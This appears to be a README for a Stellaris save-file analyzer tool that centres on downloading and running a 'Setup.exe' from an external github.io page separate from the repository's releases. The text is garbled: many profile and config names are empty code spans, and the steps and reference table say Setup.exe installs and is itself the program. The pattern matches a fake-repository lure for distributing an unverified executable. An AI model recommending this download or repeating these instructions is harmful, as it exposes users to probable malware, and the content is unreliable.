# Stellaris Save Game Analyzer – Stellaris‑Save‑Game‑Analyzer

<p align="center">
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Setup.exe-0284c7?style=flat&logo=windows&logoColor=white" alt="Download">
  </a>
  <a href="https://github.com/gigahokagepincers/Stellaris-Save-Game-Analyzer/releases">
    <img src="https://img.shields.io/github/v/release/gigahokagepincers/Stellaris-Save-Game-Analyzer?style=flat&color=0284c7&label=Version" alt="Version">
  </a>
  <a href="https://github.com/gigahokagepincers/Stellaris-Save-Game-Analyzer/blob/main/LICENSE">
    <img src="https://img.shields.io/github/license/gigahokagepincers/Stellaris-Save-Game-Analyzer?style=flat&color=0284c7&label=License" alt="License">
  </a>
</p>

---

## Why analyze a Stellaris save file?

Stellaris campaigns can span hundreds of in‑game years, and the resulting save files become dense archives of empire statistics, diplomatic histories, and hidden event flags. The **Stellaris Save Game Analyzer** decodes those binary blobs into readable tables, lets you compare snapshots, and surfaces trends that would otherwise be invisible in the UI. Whether you are polishing a long‑running empire or preparing a community‑wide post‑mortem, the Analyzer gives you a deterministic view of every stored datum.

---

## Core capabilities

- **Profile‑driven parsing** – choose from ``, ``, ``, or a hand‑crafted `` to tailor which sections of the save are extracted.
- **Preset workflows** – one‑click pipelines for “Economy Overview”, “Diplomatic Ledger”, “Tech Tree Progression”, and “Event Log” that output CSV, JSON, or formatted Markdown.
- **Batch processing** – feed a folder of saves and receive a consolidated report that highlights divergences across play‑throughs.
- **Cross‑version resilience** – the parser detects the save‑file version header and applies the appropriate field map, ensuring compatibility from the 1.0 launch up to the latest patch.

---

## Workflow presets

| Preset name | Description | Trigger command (via GUI) | Result |
|-------------|-------------|---------------------------|--------|
| **Economy Overview** | Summarizes income, expenditure, and reserves for every empire. | Press **Run → Economy** | `economy_report.csv` |
| **Diplomatic Ledger** | Lists all active treaties, claims, and war scores. | Press **Run → Diplomacy** | `diplomacy_log.json` |
| **Tech Tree Progression** | Tracks research speed, completed technologies, and pending queues. | Press **Run → Tech** | `tech_progress.md` |
| **Event Log** | Extracts every scripted event flag with timestamp. | Press **Run → Events** | `events_full.csv` |

Presets are exposed as clickable cards in the application’s start screen. Selecting a card automatically loads the associated profile (e.g., `` for the Economy Overview) and launches the parsing pipeline without additional input.

---

## Getting started

1. **Download** the latest `Setup.exe` package using the button above.
2. Run `Setup.exe`; the installer creates a folder `StellarisSaveAnalyzer` in your chosen location and copies the executable, default configuration files, and a short user manual.
3. Launch `Setup.exe`. On first start, the program validates the presence of the `configs/` directory and offers to restore any missing default profiles.
4. Drag a `.sav` file from your Stellaris `savegames/` folder onto the main window, or use **File → Open** to browse.
5. Choose a workflow preset from the ribbon, confirm the output directory, and click **Execute**.
6. Review the generated files in the `output/` sub‑folder; the README inside explains how to import CSV into spreadsheet software or embed Markdown tables into a wiki.

---

## FAQ & troubleshooting

- **The Analyzer reports “unsupported version”.**
  Ensure you are running the most recent release; the installer checks the game version against an internal compatibility table. If you are on a beta patch, place a copy of the new `version_map.json` (available in the release assets) into the `resources/` directory and restart the program.

- **Output files are empty or contain only header rows.**
  Verify that the correct profile is selected. `` includes every data block, while `` omits economic fields. Switching to a broader profile typically resolves the issue.

- **The program crashes after loading a large multi‑galaxy save.**
  Increase the allocated memory in `` by adding `max_memory=4096` (value in MB). The Analyzer will then request a larger heap on startup.

- **I need a field that is not present in any default profile.**
  Edit `` and add the field name to the `include=` list. The field identifiers can be found in the official Paradox documentation or by inspecting the raw binary with a hex editor.

---

## Contribution & roadmap

The project welcomes contributions from anyone who wishes to extend parsing coverage, improve UI ergonomics, or add new preset pipelines. Please fork the repository, create a feature branch, and submit a pull request with clear commit messages.

**Planned enhancements for the next minor version:**

- Direct export to Google Sheets via OAuth2.
- Automatic version detection for upcoming Stellaris patches.
- A lightweight CLI wrapper for headless batch jobs (still invoking `Setup.exe` under the hood).

---

### Quick reference

| Item | Location | Default |
|------|----------|---------|
| Executable | `Setup.exe` (installed by `Setup.exe`) | — |
| Config directory | `StellarisSaveAnalyzer/configs/` | ``, ``, ``, `` |
| Output folder | `StellarisSaveAnalyzer/output/` | Created on first run |
| Log file | `StellarisSaveAnalyzer/logs/analyzer.log` | Rotated daily |

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```